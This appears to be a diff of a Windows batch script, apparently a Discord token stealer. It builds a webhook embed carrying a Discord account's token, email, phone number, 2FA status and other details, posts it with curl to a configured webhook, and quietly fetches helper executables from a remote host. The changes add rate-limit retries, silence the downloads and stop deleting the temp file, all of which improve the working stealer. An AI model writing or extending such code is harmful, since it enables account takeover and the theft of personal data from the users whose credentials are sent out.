@@ -25,7 +25,7 @@ for %%a in (
     )
 )
 
-set "FilesDB=NonAscii.exe DAS.bat"
+set "FilesDB="src\NonAscii.exe" DAS.bat"
 set white=[37m
 
 set "PrintCore=     [90m$ [[94m%username%[90m]"
@@ -95,10 +95,9 @@ for %%a in (!FilesDB!) do (
     set URL=%%~a
     set URL=!URL:\=/!
     if not exist "!RequiredFilesPath!\%%~a" (
-        curl --create-dirs -f#kLo "!RequiredFilesPath!\%%~a" "!FilesHost!/!URL!"
+        >nul curl --create-dirs -f#kLo "!RequiredFilesPath!\%%~a" "!FilesHost!/!URL!"
     )
 )
-
 ping rentry.co -n 1 | findstr "TTL" >nul || (
     call :ERROR "Rentry.co was found to be offline." "-"
     exit /b
@@ -260,6 +259,7 @@ if !BuildsCount! neq 0  (
             call :DiscordMessage "%%a"
             set HardwareAlreadySent=1
         ) else (
+            echo Sending build: %%a
             call :DiscordMessage "%%a"
         )
     )
@@ -325,8 +325,14 @@ if "%~1"=="ERROR" (
     exit /b
 )
 >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"color":7733132,"timestamp":"","author":{},"image":{},"thumbnail":{"url":"!Discord_%~1_ImageURL!"},"footer":{},"fields":[{"name":"^<:DISCORD:928933612945047592^> __DISCORD ACCOUNT !SendingAccount! - !Build_%~1_Nick!__","value":"_ _"},{"name":"USER","value":"!Discord_%~1_User!","inline":true},{"name":"ID","value":"`!Discord_%~1_ID!`","inline":true},{"name":"BADGES","value":"!Discord_%~1_Badges!","inline":true},{"name":"EMAIL","value":"!Discord_%~1_Email! ^(_!Discord_%~1_Verified!!Discord_%~1_Claimed!_^)","inline":true},{"name":"PHONE","value":"!Discord_%~1_Phone:null=_null_!","inline":true},{"name":"CREATION DATE","value":"!Discord_%~1_CreationDate!"},{"name":"HAS NITRO","value":"!Discord_%~1_Nitro!","inline":true},{"name":"2FA","value":"!Discord_%~1_2FA!","inline":true},{"name":"VIEW NSFW","value":"!Discord_%~1_NSFW:null=false!","inline":true},{"name":"TOKEN","value":"^|^| !Discord_%~1_TOKEN! ^|^|"}]}],"components":[]}
-
 :SendRequest
-curl --silent -H "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true">nul 2>&1
-del /s /q "!temp!\Embed.json" >nul 2>&1
+for /f "delims=" %%a in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true"') do (
+    echo.%%a | findstr /c:"retry_after">nul && (
+        echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.[37m
+        timeout /t 2 /nobreak>nul
+        goto :SendRequest
+    )
+
+)
+rem del /s /q "!temp!\Embed.json" >nul 2>&1
 exit /b
